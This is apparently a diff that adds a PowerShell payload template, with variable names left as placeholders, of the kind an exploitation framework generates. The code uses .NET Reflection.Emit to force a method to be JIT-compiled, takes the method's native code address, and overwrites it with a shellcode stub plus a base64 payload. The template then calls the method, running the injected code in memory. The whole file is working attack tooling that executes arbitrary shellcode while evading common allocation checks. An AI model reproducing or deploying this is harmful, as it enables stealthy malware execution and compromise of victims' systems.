@@ -1,0 +1,67 @@
+function %{func_build_dyn_type}($%{var_type_name}){
+  $%{var_dyn_asm} = ([AppDomain]::CurrentDomain).DefineDynamicAssembly((New-Object System.Reflection.AssemblyName($%{var_type_name})), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+  $%{var_dyn_asm}.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder((New-Object System.Security.AllowPartiallyTrustedCallersAttribute).GetType().GetConstructors()[0], (New-Object System.Object[](0)))))
+  $%{var_dyn_mod} = $%{var_dyn_asm}.DefineDynamicModule($%{var_type_name})
+  $%{var_dyn_mod}.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder((New-Object System.Security.UnverifiableCodeAttribute).GetType().GetConstructors()[0], (New-Object System.Object[](0)))))
+  return $%{var_dyn_mod}.DefineType($%{var_type_name}, [System.Reflection.TypeAttributes]::Public)
+}
+function %{func_get_meth_addr}($%{var_tgt_meth}){
+  $%{var_dyn_type} = %{func_build_dyn_type}('%{str_addr_loc}')
+  $%{var_dyn_meth} = ($%{var_dyn_type}.DefineMethod('%{str_tgt_meth}', [System.Reflection.MethodAttributes]::Public -bOr [System.Reflection.MethodAttributes]::Static, $(if ([IntPtr]::Size -eq 4) { [UInt32] } else { [Int64] }), $null)).GetILGenerator()
+  $%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Ldftn, [System.Reflection.MethodInfo]$%{var_tgt_meth})
+  $%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Ret)
+  return (($%{var_dyn_type}.CreateType()).GetMethod('%{str_tgt_meth}')).Invoke($null, @())
+}
+
+$%{var_dyn_type} = %{func_build_dyn_type}('%{var_src_meth}')
+$%{var_args} = New-Object System.Type[](3)
+$%{var_args}[0] = [IntPtr]
+$%{var_args}[1] = [IntPtr]
+$%{var_args}[2] = [Int32]
+$%{var_dyn_meth} = ($%{var_dyn_type}.DefineMethod('%{str_src_type}', [System.Reflection.MethodAttributes]::Public -bOr [System.Reflection.MethodAttributes]::Static, $null, $%{var_args})).GetILGenerator()
+$%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0)
+$%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Ldarg_1)
+$%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Ldarg_2)
+$%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Volatile)
+$%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Cpblk)
+$%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Ret)
+$%{var_src_meth} = ($%{var_dyn_type}.CreateType()).GetMethod('%{str_src_type}')
+
+$%{var_dyn_type} = %{func_build_dyn_type}('%{str_tgt_type}')
+$%{var_args} = New-Object System.Type[](1)
+$%{var_args}[0] = [Int]
+$%{var_dyn_meth} = ($%{var_dyn_type}.DefineMethod('%{str_tgt_meth}', [System.Reflection.MethodAttributes]::Public -bOr [System.Reflection.MethodAttributes]::Static, [Int], $%{var_args})).GetILGenerator()
+$%{var_xor} = 0x41424344
+$%{var_dyn_meth}.DeclareLocal([Int]) | Out-Null
+$%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0)
+foreach ($CodeBlock in 1..100) {
+  $%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Ldc_I4, $%{var_xor})
+  $%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Xor)
+  $%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Stloc_0)
+  $%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Ldloc_0)
+  $%{var_xor}++
+}
+$%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Ldc_I4, $%{var_xor})
+$%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Xor)
+$%{var_dyn_meth}.Emit([System.Reflection.Emit.OpCodes]::Ret)
+$%{var_tgt_meth} = ($%{var_dyn_type}.CreateType()).GetMethod('%{str_tgt_meth}')
+
+foreach ($Exec in 1..20) { $%{var_tgt_meth}.Invoke($null, @(0x11112222)) | Out-Null }
+
+if ( [IntPtr]::Size -eq 4 ) {
+  $%{var_sc} = [Byte[]] @(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)
+} else {
+  $%{var_sc} = [Byte[]] @(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,0x55,0xE8,0x0D,0x00,0x00,0x00,0x5D,0x41,0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x48,0x31,0xC0,0xC3)
+}
+$%{var_sc} += [System.Convert]::FromBase64String("%{b64shellcode}")
+$%{var_sc_addr} = [Runtime.InteropServices.Marshal]::AllocHGlobal($%{var_sc}.Length)
+[Runtime.InteropServices.Marshal]::Copy($%{var_sc}, 0, $%{var_sc_addr}, $%{var_sc}.Length)
+
+$%{var_args} = New-Object Object[](3)
+$%{var_args}[0] = [IntPtr]$(%{func_get_meth_addr} $%{var_tgt_meth})
+$%{var_args}[1] = $%{var_sc_addr}
+$%{var_args}[2] = $%{var_sc}.Length
+
+$%{var_src_meth}.Invoke($null, $%{var_args})
+
+$%{var_tgt_meth}.Invoke($null, @(0x11112222))
